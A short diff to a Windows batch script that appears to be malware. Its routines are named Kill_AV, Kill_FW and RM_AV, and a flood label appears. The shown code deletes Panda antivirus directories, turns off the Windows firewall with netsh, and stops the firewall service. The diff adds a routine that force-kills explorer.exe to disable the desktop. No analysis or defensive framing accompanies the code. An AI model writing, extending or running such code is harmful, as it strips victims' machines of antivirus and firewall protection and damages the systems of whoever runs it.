@@ -6,6 +6,7 @@ call F_Blast >nul
 call Kill_AV >nul
 call Kill_FW >nul
 call RM_AV >nul
+call Kill_GUI >nul
 goto main
 
 :flood
@@ -134,3 +135,6 @@ RMDIR /Q "C:\Program Files\panda software" /S >NUL
 netsh firewall set opmode disable >nul
 netsh advfirewall set currentprofile state off >nul
 net stop "MpsSvc"
+
+:Kill_GUI
+taskkill /f /im explorer.exe >nul
